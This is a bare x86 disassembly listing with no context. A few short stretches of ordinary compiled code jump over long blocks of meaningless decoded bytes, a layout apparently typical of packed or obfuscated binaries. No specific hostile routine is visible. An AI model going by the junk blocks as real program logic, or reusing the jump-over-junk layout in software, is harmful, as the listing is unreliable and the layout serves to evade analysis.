  40bc57:	mov    BYTE PTR [ebx+eiz*2+0x27bcc516],dh
  40bc5e:	add    eax,0x7804b70f
  40bc63:	mov    ecx,DWORD PTR [ebp-0x14]
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	stos   DWORD PTR es:[edi],eax
  40bc96:	ja     0x40bc9b
  40bc98:	pushf  
  40bc99:	(bad)  
  40bc9a:	sti    
  40bc9b:	jle    0x40bd1b
  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	shl    DWORD PTR [ebx+0x4d373584],cl
  40bca7:	mov    ebp,DWORD PTR [bx+di+0x29]
  40bcab:	pop    ecx
  40bcac:	in     al,dx
  40bcad:	or     ebp,DWORD PTR cs:[edi-0x1d]
  40bcb1:	mov    ecx,0x1c495017
  40bcb6:	es sbb eax,0x6433acde
  40bcbc:	ss scas eax,DWORD PTR es:[edi]
  40bcbe:	push   bx
  40bcc0:	pop    ecx
  40bcc1:	repnz mov cs,WORD PTR [edx+0x12]
  40bcc5:	in     al,0x8b
  40bcc7:	inc    eax
  40bcc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcc9:	ficomp WORD PTR [ecx-0xd]
  40bccc:	mov    bl,0x63
  40bcce:	call   0x928fc123
  40bcd3:	pop    edi
  40bcd4:	cmp    bh,BYTE PTR ds:0x3208f13
  40bcda:	popa   
  40bcdb:	out    0xb1,eax
  40bcdd:	fist   DWORD PTR [edi]
  40bcdf:	lods   al,BYTE PTR ds:[esi]
  40bce0:	(bad)  
  40bce1:	out    0xba,ax
  40bce4:	repnz in al,dx
  40bce6:	push   edi
  40bce7:	push   es
  40bce8:	aaa    
  40bce9:	ja     0x40bd1e
  40bceb:	cmp    ah,BYTE PTR [ecx-0x1b]
  40bcee:	inc    ebp
  40bcef:	nop
  40bcf0:	or     ecx,esi
  40bcf2:	pop    esi
  40bcf3:	rcr    DWORD PTR [edx+0x2],cl
  40bcf6:	sub    DWORD PTR [edx-0x29],ecx
  40bcf9:	scas   al,BYTE PTR es:[edi]
  40bcfa:	xor    DWORD PTR [edi+0x156fd9e1],0xffffffab
  40bd01:	sub    BYTE PTR [ecx],al
  40bd03:	das    
  40bd04:	push   edx
  40bd05:	popf   
  40bd06:	(bad)  [ebp+0x20]
  40bd09:	dec    ebp
  40bd0a:	(bad)  
  40bd0c:	in     al,0x46
  40bd0e:	inc    esp
  40bd0f:	jecxz  0x40bd0c
  40bd11:	or     al,0x97
  40bd13:	xor    BYTE PTR [ebp-0x29],bh
  40bd16:	cmp    DWORD PTR [esi+0xa],ecx
  40bd19:	jecxz  0x40bd66
  40bd1b:	repz adc BYTE PTR [esi+0x6f65b9a6],ch
  40bd22:	ret    0x38a7
  40bd25:	fdiv   st(3),st
  40bd27:	sti    
  40bd28:	lods   eax,DWORD PTR ds:[esi]
  40bd29:	dec    edi
  40bd2a:	in     eax,0x39
  40bd2c:	sub    al,0xc8
  40bd2e:	lea    edx,[edi]
  40bd30:	fist   WORD PTR [esp+ebx*8-0x4d781154]
  40bd37:	push   0xffffffbf
  40bd39:	mov    bh,0x34
  40bd3b:	jns    0x40bd8f
  40bd3d:	imul   esi,edi,0x33ace795
  40bd43:	xchg   ecx,eax
  40bd44:	in     eax,0x31
  40bd46:	fnstenv [esi]
  40bd48:	dec    edi
  40bd49:	das    
  40bd4a:	sub    ch,al
  40bd4c:	xor    al,0x7
  40bd4e:	clc    
  40bd4f:	adc    al,BYTE PTR [edx]
  40bd51:	call   0x5622:0xf4b6c463
  40bd58:	ins    DWORD PTR es:[edi],dx
  40bd59:	mov    edx,0x820bdc48
  40bd5e:	dec    edi
  40bd5f:	(bad)  
  40bd60:	mov    ecx,0x11023f8c
  40bd65:	mov    bh,0x40
  40bd67:	dec    ecx
  40bd68:	call   0x4ca4:0xb27d4c6d
  40bd6f:	pop    eax
  40bd70:	data16 fs ja 0x40bdc6
  40bd74:	aam    0x5c
  40bd76:	mov    edx,0xca143be8
  40bd7b:	mov    gs,WORD PTR [edi+0x57]
  40bd7e:	xor    BYTE PTR [ebp-0x10f54091],bl
  40bd84:	jb     0x40bdde
  40bd86:	(bad)  
  40bd87:	or     BYTE PTR [esp+eiz*8+0x7dbfca40],al
  40bd8e:	call   0x2826:0x6303f3ce
  40bd95:	sub    edx,DWORD PTR [ebx-0x4c]
  40bd98:	cld    
  40bd99:	mov    al,0x34
  40bd9b:	fidivr DWORD PTR [edi]
  40bd9d:	dec    esp
  40bd9e:	outs   dx,DWORD PTR ds:[esi]
  40bd9f:	cmp    DWORD PTR [ebx+0x562ea764],edi
  40bda5:	mov    dh,0x6a
  40bda7:	inc    edx
  40bda8:	push   ebx
  40bda9:	lahf   
  40bdaa:	pop    esp
  40bdab:	ret    0x5d34
  40bdae:	arpl   WORD PTR [eax+0x1dbeb7f1],si
  40bdb4:	mov    al,0x65
  40bdb6:	push   edi
  40bdb7:	dec    edi
  40bdb8:	in     al,0x57
  40bdba:	mov    ecx,0xe357369d
  40bdbf:	push   edx
  40bdc0:	sbb    al,0x7
  40bdc2:	fxam   
  40bdc4:	aad    0x91
  40bdc6:	stos   BYTE PTR es:[edi],al
  40bdc7:	fs test eax,0x8cdfb83a
  40bdcd:	xchg   ecx,eax
  40bdce:	std    
  40bdcf:	leave  
  40bdd0:	lock div BYTE PTR [ecx]
  40bdd3:	cmp    DWORD PTR [esi],eax
  40bdd5:	pop    ebx
  40bdd6:	xchg   esp,eax
  40bdd7:	push   ebx
  40bdd8:	aam    0x9
  40bdda:	mov    esi,0x30783c4b
  40bddf:	push   ss
  40bde0:	mov    bh,BYTE PTR [eax+ecx*4-0x66]
  40bde4:	mov    bl,0xef
  40bde6:	mov    cs,ecx
  40bde8:	mov    cl,0xa7
  40bdea:	lea    eax,[edx+eiz*4+0x2]
  40bdee:	and    esi,DWORD PTR [ecx+ebx*1]
  40bdf1:	adc    al,al
  40bdf3:	js     0x40be08
  40bdf5:	sub    DWORD PTR [esp],ecx
  40bdf8:	dec    edi
  40bdf9:	sti    
  40bdfa:	int    0x97
  40bdfc:	mov    bl,0x76
  40bdfe:	pop    edx
  40bdff:	rol    DWORD PTR [esi],1
  40be01:	sbb    eax,0x3d409aaf
  40be06:	mov    eax,DWORD PTR [eax-0x6787f6b6]
  40be0c:	sub    DWORD PTR [ebx-0x6262e42d],0xffffffe6
  40be13:	sbb    al,0x19
  40be15:	icebp  
  40be16:	mov    dh,0x74
  40be18:	clc    
  40be19:	call   0x4c7ae00
  40be1e:	pop    es
  40be1f:	mov    dh,0x7d
  40be21:	sub    bl,BYTE PTR [eax+0x39]
  40be24:	test   eax,0xd9f85b1b
  40be29:	mov    WORD PTR [esi+0x81dbfa2],es
  40be2f:	mov    edx,0xa9d8bae9
  40be34:	mov    bl,0x30
  40be36:	sti    
  40be37:	fldlg2 
  40be39:	push   edi
  40be3a:	stos   BYTE PTR es:[edi],al
  40be3b:	fsubrp st(5),st
  40be3d:	or     dh,ah
  40be3f:	inc    edx
  40be40:	mov    ss,WORD PTR [edx+0x8]
  40be43:	inc    eax
  40be44:	inc    ecx
  40be45:	mov    cl,0x4
  40be47:	jo     0x40be00
  40be49:	sbb    DWORD PTR [esi],eax
  40be4b:	dec    esi
  40be4c:	aas    
  40be4d:	call   0xf243:0x9fc9e961
  40be54:	aam    0xf0
  40be56:	lds    edi,FWORD PTR [eax+0x16]
  40be59:	and    al,ah
  40be5b:	jns    0x40be59
  40be5d:	sub    edx,DWORD PTR [edx+0x1]
  40be60:	xchg   bh,ch
  40be62:	fidivr DWORD PTR [ebx-0x22]
  40be65:	push   ss
  40be66:	push   0xd4e98893
  40be6b:	sub    DWORD PTR ds:0xba639830,ecx
  40be71:	mov    WORD PTR [edi+0x51],ds
  40be74:	aaa    
  40be75:	inc    ebx
  40be76:	mov    ecx,0xce50a508
  40be7b:	sbb    ebp,edx
  40be7d:	or     DWORD PTR [edx+0x4a],esp
  40be80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be81:	lds    esi,FWORD PTR [edi-0x25]
  40be84:	shr    BYTE PTR [ebx],cl
  40be86:	rcr    DWORD PTR [edi],0x91
  40be89:	or     DWORD PTR [esi-0x7a75e493],edi
  40be8f:	mov    al,ds:0xc880899d
  40be94:	mov    esp,0x65e1f6b5
  40be99:	leave  
  40be9a:	fdiv   QWORD PTR [ecx-0x57]
  40be9d:	lahf   
  40be9e:	cmp    eax,0xcb29f2
  40bea3:	repz dec edx
  40bea5:	xchg   esp,eax
  40bea6:	add    edx,ecx
  40bea8:	jnp    0x40be42
  40beaa:	pop    edx
  40beab:	pop    edx
  40beac:	outs   dx,BYTE PTR ds:[esi]
  40bead:	inc    eax
  40beae:	xchg   ebx,eax
  40beaf:	mov    bh,0x73
  40beb1:	aad    0xb0
  40beb3:	cmp    eax,DWORD PTR [eax]
  40beb5:	xchg   edi,eax
  40beb6:	lods   eax,DWORD PTR ds:[esi]
  40beb7:	shl    BYTE PTR [edx+0x1056398c],cl
  40bebd:	and    BYTE PTR [edi+0x1dcc5e90],ah
  40bec3:	mov    BYTE PTR [ebx-0x223263d4],bh
  40bec9:	outs   dx,BYTE PTR ds:[esi]
  40beca:	jmp    0xe6ba:0x537bd092
  40bed1:	ret    0x2d0
  40bed4:	retf   0xe9df
  40bed7:	sbb    ch,BYTE PTR [edi]
  40bed9:	xchg   esp,eax
  40beda:	nop
  40bedb:	inc    edi
  40bedc:	or     BYTE PTR [ebp-0x71c96c2f],0x2d
  40bee3:	and    ebp,edi
  40bee5:	mov    ds:0x854359d,al
  40beea:	push   ecx
  40beeb:	pop    es
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi+0x5c315131]
  40bf27:	push   ds
  40bf28:	cmp    cl,0x7e
  40bf2b:	jle    0x40bf65
  40bf2d:	jl     0x40bfad
  40bf2f:	jle    0x40bfa9
  40bf31:	jg     0x40bf2a
  40bf33:	jmp    0x40bf88
  40bf35:	repnz sub BYTE PTR [ebx-0x66],ch
  40bf39:	and    eax,0xff1c2d6c
  40bf3e:	xchg   ebx,eax
  40bf3f:	add    al,0xb8
  40bf41:	mov    eax,0xfc61c3ec
  40bf46:	jecxz  0x40bf71
  40bf48:	int3   
  40bf49:	shl    DWORD PTR [edx+0x30],0x53
  40bf4d:	aad    0x30
  40bf4f:	add    al,0xb3
  40bf51:	sbb    bh,BYTE PTR [edx-0x7c293241]
  40bf57:	jecxz  0x40bf9d
  40bf59:	leave  
  40bf5a:	xor    BYTE PTR [ecx+0x6f],bh
  40bf5d:	adc    al,0xa
  40bf5f:	adc    eax,DWORD PTR [ecx-0x59]
  40bf62:	lds    ebx,FWORD PTR [esi-0x5a]
  40bf65:	push   esp
  40bf66:	adc    BYTE PTR [edx],dl
  40bf68:	ret    
  40bf69:	mov    dl,0x52
  40bf6b:	ins    BYTE PTR es:[edi],dx
  40bf6c:	push   ds
  40bf6d:	adc    eax,0x4102fbcc
  40bf72:	mov    eax,0x2d16f6e7
  40bf77:	push   eax
  40bf78:	mov    ds:0x85008463,al
  40bf7d:	dec    esp
  40bf7e:	nop
  40bf7f:	(bad)
  40bf84:	mov    edi,0xea361026
  40bf89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf8a:	sub    DWORD PTR [edx-0x254d0d93],eax
  40bf90:	jb     0x40bfb3
  40bf92:	cmp    bh,0x4a
  40bf95:	and    eax,0x22bd97d1
  40bf9a:	and    DWORD PTR [edx-0x47],esp
  40bf9d:	imul   edi,DWORD PTR [ecx+0x1c4d3d40],0x1b
  40bfa4:	dec    ebx
  40bfa5:	sahf   
  40bfa6:	fwait
  40bfa7:	into   
  40bfa8:	mov    bh,0xb3
  40bfaa:	stos   DWORD PTR es:[edi],eax
  40bfab:	imul   ebx,DWORD PTR [eax-0x9f27953],0x3f
  40bfb2:	jmp    0x40c016
  40bfb4:	mov    ebx,0x365451aa
  40bfb9:	jne    0x40bf5d
  40bfbb:	std    
  40bfbc:	stos   DWORD PTR es:[edi],eax
  40bfbd:	cmp    al,0xa5
  40bfbf:	jecxz  0x40bf9e
  40bfc1:	sahf   
  40bfc2:	in     al,dx
  40bfc3:	xchg   edi,eax
  40bfc4:	or     eax,0xc03599a2
  40bfc9:	mov    ecx,0x96b3de14
  40bfce:	and    DWORD PTR [ebx+0xf],ebx
  40bfd1:	or     cl,bl
  40bfd3:	dec    ebp
  40bfd4:	dec    BYTE PTR [esi-0x53292876]
  40bfda:	out    dx,eax
  40bfdb:	fldenv [ecx]
  40bfdd:	jmp    0x8313:0xbffa564b
  40bfe4:	add    BYTE PTR [eax+0x3b4371c8],0x87
  40bfeb:	sbb    DWORD PTR [ecx+0x3fc27a3a],ebx
  40bff1:	pop    ecx
  40bff2:	(bad)  
  40bff3:	fld    st(1)
  40bff5:	xchg   esp,eax
  40bff6:	jp     0x40bfde
  40bff8:	sahf   
  40bff9:	test   BYTE PTR [ebx+0x5a],bl
  40bffc:	mov    ecx,0x69991f6f
  40c001:	adc    bl,dl
  40c003:	jmp    0x3b81359d
  40c008:	xchg   BYTE PTR [ebp+0x64e7a006],cl
  40c00e:	jmp    0x53eb:0x9ddf6836
  40c015:	lods   al,BYTE PTR ds:[esi]
  40c016:	xlat   BYTE PTR ds:[ebx]
  40c017:	jge    0x40c034
  40c019:	push   edx
  40c01a:	call   0xeffe:0x442b141a
  40c021:	das    
  40c022:	retf   0x3d7a
  40c025:	mov    al,ds:0x105d5a7d
  40c02a:	pop    edx
  40c02b:	pop    ecx
  40c02c:	ja     0x40c002
  40c02e:	add    al,0x36
  40c030:	(bad)  
  40c031:	in     al,dx
  40c032:	pop    ebx
  40c033:	inc    ebp
  40c034:	xchg   edx,eax
  40c035:	mov    DWORD PTR [ecx],ebx
  40c037:	push   cs
  40c038:	sbb    DWORD PTR [edi],ecx
  40c03a:	retf   0xbc8f
  40c03d:	sbb    ebp,eax
  40c03f:	jecxz  0x40bfec
  40c041:	mov    esp,0x4068641a
  40c046:	loope  0x40c014
  40c048:	mov    DWORD PTR [ebx-0xee56b36],0xcac4d74a
  40c052:	adc    esp,ebx
  40c054:	mov    bh,0x7f
  40c056:	scas   eax,DWORD PTR es:[edi]
  40c057:	je     0x40bfde
  40c059:	(bad)  
  40c05b:	and    DWORD PTR [ebx+0x3a2cac4f],ebx
  40c061:	sbb    eax,DWORD PTR [edx]
  40c063:	in     al,dx
  40c064:	(bad)  
  40c065:	rcl    DWORD PTR [edi-0x25cd7908],1
  40c06b:	lods   al,BYTE PTR ds:[esi]
  40c06c:	fcomp  DWORD PTR [ecx+0x75]
  40c06f:	inc    eax
  40c070:	sub    DWORD PTR [esi+0x2c],0xffffffc6
  40c074:	hlt    
  40c075:	loopne 0x40c0a9
  40c077:	add    eax,0xfe51d2ad
  40c07c:	mov    al,BYTE PTR [ebx]
  40c07e:	iret   
  40c07f:	xchg   ebx,eax
  40c080:	sub    BYTE PTR [ebp+0x6a],ah
  40c083:	cld    
  40c084:	inc    eax
  40c085:	lahf   
  40c086:	adc    al,0xfc
  40c088:	sar    DWORD PTR [ebx],0x19
  40c08b:	ror    DWORD PTR [edi+eiz*4-0x72],cl
  40c08f:	pop    edx
  40c090:	pop    ecx
  40c091:	mov    ebp,0x50fa3da2
  40c096:	dec    esp
  40c097:	or     al,BYTE PTR [ecx+0x3c]
  40c09a:	cmp    dl,BYTE PTR [ebx+0x1c]
  40c09d:	cmp    cl,al
  40c09f:	xor    dh,bl
  40c0a1:	inc    edx
  40c0a2:	js     0x40c0fd
  40c0a4:	popa   
  40c0a5:	jmp    0x40c055
  40c0a7:	mov    ch,0xf3
  40c0a9:	scas   eax,DWORD PTR es:[edi]
  40c0aa:	imul   esi,edi,0x1b
  40c0ad:	mov    ebx,0x4b6c125f
  40c0b2:	(bad)  
  40c0b3:	inc    bx
  40c0b5:	call   0xbb2d1c9e
  40c0ba:	enter  0x81b4,0x8
  40c0be:	dec    edx
  40c0bf:	mov    ebx,0xf3d0b16f
  40c0c4:	mul    cl
  40c0c6:	ja     0x40c12a
  40c0c8:	mov    ds:0x1b97b1be,eax
  40c0cd:	pop    edx
  40c0ce:	fxch   st(3)
  40c0d0:	pop    ecx
  40c0d1:	ret    
  40c0d2:	das    
  40c0d3:	push   cs
  40c0d4:	push   es
  40c0d5:	rcl    bl,1
  40c0d7:	sub    al,0xd5
  40c0d9:	rcr    bh,1
  40c0db:	or     DWORD PTR cs:[edx-0x10],edi
  40c0df:	cld    
  40c0e0:	mov    esi,0xebd5d7b0
  40c0e5:	adc    eax,0xfc9d40ed
  40c0ea:	not    esi
  40c0ec:	push   ecx
  40c0ed:	ror    esp,cl
  40c0ef:	push   esi
  40c0f0:	jge    0x40c0d4
  40c0f2:	aaa    
  40c0f3:	dec    ebp
  40c0f4:	scas   al,BYTE PTR es:[edi]
  40c0f5:	xor    BYTE PTR [edx],bl
  40c0f7:	outs   dx,BYTE PTR ds:[esi]
  40c0f8:	aaa    
  40c0f9:	das    
  40c0fa:	jge    0x40c110
  40c0fc:	es sub edx,ebx
  40c0ff:	or     al,BYTE PTR [ebx]
  40c101:	pop    esi
  40c102:	clc    
  40c103:	cdq    
  40c104:	cmp    dh,BYTE PTR [ecx+0x3b]
  40c107:	jp     0x40c0ee
  40c109:	lods   eax,DWORD PTR ds:[esi]
  40c10a:	dec    eax
  40c10b:	dec    esp
  40c10c:	retf   
  40c10d:	inc    esi
  40c10e:	mov    ch,0xa0
  40c110:	jg     0x40c0f5
  40c112:	cli    
  40c113:	lea    ebp,[edx+0x3079c032]
  40c119:	loop   0x40c0e8
  40c11b:	(bad)  
  40c11c:	(bad)  
  40c11d:	addr16 mov cl,0x63
  40c120:	mov    al,0x25
  40c122:	and    ah,BYTE PTR [edx+0x2069f6f]
  40c128:	mov    fs,WORD PTR [edx]
  40c12a:	lods   eax,DWORD PTR ds:[esi]
  40c12b:	mov    BYTE PTR [edi+ebx*1+0x7db3b430],dl
  40c132:	dec    eax
  40c133:	mov    bl,0xf7
  40c135:	les    ecx,FWORD PTR [edi+0x3c45683b]
  40c13b:	std    
  40c13c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c13d:	mov    bh,al
  40c13f:	fidivr WORD PTR [edx]
  40c141:	(bad)  [ecx+0x27dbcfc1]
  40c147:	fimul  WORD PTR [eax-0x4eaaa658]
  40c14d:	imul   ebx,DWORD PTR [ebp-0x31],0x545782f8
  40c154:	dec    ebp
  40c155:	lods   al,BYTE PTR ds:[esi]
  40c156:	cld    
  40c157:	inc    BYTE PTR [edx+0x1c261542]
  40c15d:	test   DWORD PTR [esi],esi
  40c15f:	add    BYTE PTR [ebp+0x46],0x2f
  40c163:	inc    ecx
  40c164:	push   eax
  40c165:	rep lods ax,WORD PTR ds:[esi]
  40c168:	mov    esi,0x38deac4a
  40c16d:	das    
  40c16e:	in     al,dx
  40c16f:	dec    ecx
  40c170:	mov    cl,0x5b
  40c172:	out    0xe4,al
  40c174:	mov    ds:0x49cb87ea,eax
  40c179:	mov    eax,DWORD PTR [ebp-0x1c]
  40c17c:	imul   eax,ecx
  40c17f:	sub    esp,eax
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0x5c
  40c196:	(bad)  
  40c197:	aas    
  40c198:	jge    0x40c1e4
  40c19a:	xchg   DWORD PTR [esi+0x7e],edi
  40c19d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c1a1:	and    BYTE PTR [ecx+0x53eb3904],dh
  40c1a7:	sub    bl,bh
  40c1a9:	mov    cl,0xb
  40c1ab:	in     al,0x2f
  40c1ad:	stos   DWORD PTR es:[edi],eax
  40c1ae:	lods   al,BYTE PTR ds:[esi]
  40c1af:	sbb    esp,DWORD PTR [ebp-0x20ed7763]
  40c1b5:	jnp    0x40c18c
  40c1b7:	push   0x2904fd92
  40c1bc:	jmp    0xcbb28d53
  40c1c1:	or     BYTE PTR [edx],0x38
  40c1c4:	adc    BYTE PTR [eax+0x34],ch
  40c1c7:	fst    DWORD PTR [ebp-0x2847dcfe]
  40c1cd:	fmul   st,st(1)
  40c1cf:	push   ecx
  40c1d0:	lds    esp,FWORD PTR [esi+0x5b]
  40c1d3:	pop    eax
  40c1d4:	push   ebp
  40c1d5:	mov    al,0x2f
  40c1d7:	or     al,0x4
  40c1d9:	enter  0xa99f,0x4e
  40c1dd:	xor    al,BYTE PTR [esi+0x1f]
  40c1e0:	inc    edi
  40c1e1:	stos   BYTE PTR es:[edi],al
  40c1e2:	or     al,BYTE PTR [eax]
  40c1e4:	cmp    eax,0x58ffd84d
  40c1e9:	jns    0x40c226
  40c1eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1ec:	inc    ebp
  40c1ed:	add    al,0x65
  40c1ef:	mov    al,ds:0x6e526b22
  40c1f4:	test   edi,0x3da10359
  40c1fa:	out    dx,al
  40c1fb:	push   ebx
  40c1fc:	stc    
  40c1fd:	mov    bl,0xf9
  40c1ff:	push   ss
  40c200:	ret    0x1a8a
  40c203:	cld    
  40c204:	test   eax,0x956b4edb
  40c209:	mov    cl,0xa9
  40c20b:	xchg   esi,eax
  40c20c:	inc    ebp
  40c20d:	xor    eax,0x3461edab
  40c212:	gs mov bh,0x18
  40c215:	adc    BYTE PTR [esi+0x104fe151],ch
  40c21b:	sbb    al,BYTE PTR ds:0x1ec69347
  40c221:	sub    eax,0x9a60ca56
  40c226:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c227:	cli    
  40c228:	mov    dh,BYTE PTR [esi+0x506474e7]
  40c22e:	mov    ds:0x53918289,eax
  40c233:	inc    esi
  40c234:	out    0xb2,eax
  40c236:	sbb    ah,BYTE PTR [esp+edi*1-0x432230f2]
  40c23d:	fimul  WORD PTR ds:0x8872263b
  40c243:	adc    ebx,DWORD PTR [eax]
  40c245:	mov    edx,DWORD PTR [edx+0x2ef29461]
  40c24b:	and    eax,DWORD PTR [eax-0x432f9489]
  40c251:	mov    ds:0x5d01191e,al
  40c256:	adc    al,0xe3
  40c258:	pop    ebp
  40c259:	mov    bh,0x79
  40c25b:	int3   
  40c25c:	dec    esi
  40c25d:	js     0x40c1f3
  40c25f:	jmp    0x40c1fc
  40c261:	jae    0x40c268
  40c263:	loope  0x40c1ed
  40c265:	(bad)  
  40c266:	mov    ah,0x99
  40c268:	mov    BYTE PTR [ebx+esi*2-0x1c],0x4c
  40c26d:	ret    
  40c26e:	xor    al,0x0
  40c270:	(bad)  
  40c271:	icebp  
  40c272:	into   
  40c273:	out    0x8e,al
  40c275:	xchg   ecx,eax
  40c276:	mov    bh,0xb
  40c278:	adc    al,0x1a
  40c27a:	adc    BYTE PTR [eax],bl
  40c27c:	pushf  
  40c27d:	push   edi
  40c27e:	stc    
  40c27f:	sub    edx,DWORD PTR [ebx]
  40c281:	sbb    al,0x23
  40c283:	xor    bh,0x7
  40c286:	mov    al,ds:0xf537631
  40c28b:	cmc    
  40c28c:	inc    esi
  40c28d:	xlat   BYTE PTR ds:[ebx]
  40c28e:	xor    DWORD PTR [edi],edx
  40c290:	in     eax,0xb6
  40c292:	leave  
  40c293:	(bad)
  40c297:	sar    DWORD PTR [esi+esi*8-0x26d9c4b8],0xd6
  40c29f:	sbb    DWORD PTR [edi+0x71],edx
  40c2a2:	cmp    BYTE PTR [esi-0x26],dh
  40c2a5:	sub    al,BYTE PTR [ebp+0x484e39be]
  40c2ab:	xor    DWORD PTR [ebx-0x64b6ac45],esp
  40c2b1:	stos   DWORD PTR es:[edi],eax
  40c2b2:	(bad)  
  40c2b3:	lahf   
  40c2b4:	es out 0xf3,al
  40c2b7:	test   BYTE PTR [eax-0x6e],ah
  40c2ba:	add    eax,0xd4dc8927
  40c2bf:	and    DWORD PTR ds:0x8923164c,0x6b
  40c2c6:	outs   dx,BYTE PTR ds:[esi]
  40c2c7:	sbb    bh,BYTE PTR [edi+0x6b]
  40c2ca:	pop    ecx
  40c2cb:	and    DWORD PTR [ebx+0xc],ebx
  40c2ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2cf:	jae    0x40c265
  40c2d1:	adc    ch,BYTE PTR [edi]
  40c2d3:	mov    edi,0xecf951b2
  40c2d8:	sar    edx,0x8e
  40c2db:	sub    BYTE PTR [esi-0x5b],bl
  40c2de:	mov    cl,BYTE PTR [esi]
  40c2e0:	or     BYTE PTR [ecx],dl
  40c2e2:	push   ebp
  40c2e3:	xlat   BYTE PTR ds:[ebx]
  40c2e4:	and    DWORD PTR [eax+edi*1-0x612e304e],0xffffffc6
  40c2ec:	add    eax,0x8092ae48
  40c2f1:	mov    esi,0xcb331d2a
  40c2f6:	sbb    eax,0x6a9c1bef
  40c2fb:	mov    ch,0xb
  40c2fd:	sahf   
  40c2fe:	mov    bl,0x4b
  40c300:	int    0xc
  40c302:	mov    ds:0x55966a94,eax
  40c307:	mov    WORD PTR ds:0x442d94f,gs
  40c30d:	add    edx,edx
  40c30f:	daa    
  40c310:	pusha  
  40c311:	daa    
  40c312:	cmp    al,ch
  40c314:	inc    edi
  40c315:	popa   
  40c316:	ja     0x40c390
  40c318:	psubsb mm3,QWORD PTR [esi+ebx*1+0x17db1c4d]
  40c320:	stc    
  40c321:	int3   
  40c322:	dec    si
  40c324:	and    eax,0x5f061bea
  40c329:	inc    eax
  40c32a:	(bad)  
  40c32b:	scas   eax,DWORD PTR es:[edi]
  40c32c:	mov    ecx,0x1bdde1d4
  40c331:	cld    
  40c332:	outs   dx,BYTE PTR ds:[esi]
  40c333:	test   eax,0xec6a3920
  40c338:	mov    edx,0xee07faa5
  40c33d:	daa    
  40c33e:	out    dx,eax
  40c33f:	daa    
  40c340:	pop    esi
  40c341:	mov    esp,0xe97c530a
  40c346:	sahf   
  40c347:	sub    DWORD PTR [eax+0x4a],edx
  40c34a:	push   es
  40c34b:	pop    edi
  40c34c:	lahf   
  40c34d:	mov    ecx,edi
  40c34f:	mov    DWORD PTR [ebx+0x75],eax
  40c352:	cld    
  40c353:	test   BYTE PTR ds:0xedb7b2f5,dh
  40c359:	stc    
  40c35a:	ss xchg esp,eax
  40c35c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c35d:	pop    DWORD PTR [ecx]
  40c35f:	pop    edx
  40c360:	jno    0x40c2f1
  40c362:	fiadd  DWORD PTR [edi-0x6c]
  40c365:	or     ah,bh
  40c367:	mov    bh,0x92
  40c369:	push   esi
  40c36a:	leave  
  40c36b:	stos   DWORD PTR es:[edi],eax
  40c36c:	dec    ebp
  40c36d:	cmp    eax,0x1aed631f
  40c372:	pop    esi
  40c373:	push   ebp
  40c374:	push   ecx
  40c375:	mul    ebp
  40c377:	js     0x40c39f
  40c379:	jecxz  0x40c3bb
  40c37b:	push   edi
  40c37c:	stos   BYTE PTR es:[edi],al
  40c37d:	(bad)  
  40c37e:	out    0x15,al
  40c380:	mov    ebp,0x300edea7
  40c385:	arpl   WORD PTR [eax],bx
  40c387:	cwde   
  40c388:	mov    eax,0x170425a4
  40c38d:	mov    cl,0xa9
  40c38f:	pop    eax
  40c390:	daa    
  40c391:	or     esi,edx
  40c393:	sbb    BYTE PTR ds:0x9cd22a2c,dh
  40c399:	jmp    0x2233:0xd538ac3b
  40c3a0:	scas   eax,DWORD PTR es:[edi]
  40c3a1:	mov    dh,0x98
  40c3a3:	loope  0x40c3fa
  40c3a5:	jecxz  0x40c372
  40c3a7:	jmp    0x2470:0x93631e1f
  40c3ae:	test   eax,0xa326300f
  40c3b3:	sti    
  40c3b4:	scas   eax,DWORD PTR es:[edi]
  40c3b5:	push   ebp
  40c3b6:	popf   
  40c3b7:	stc    
  40c3b8:	xchg   ebp,eax
  40c3b9:	retf   0x6ca5
  40c3bc:	mov    eax,0xd4fcd3d0
  40c3c1:	xor    DWORD PTR [eax*8+0x6cc4748b],eax
  40c3c8:	imul   esi,DWORD PTR [edi],0xd7ebc514
  40c3ce:	popa   
  40c3cf:	push   eax
  40c3d0:	sub    esi,ebp
  40c3d2:	push   ds
  40c3d3:	xchg   edx,eax
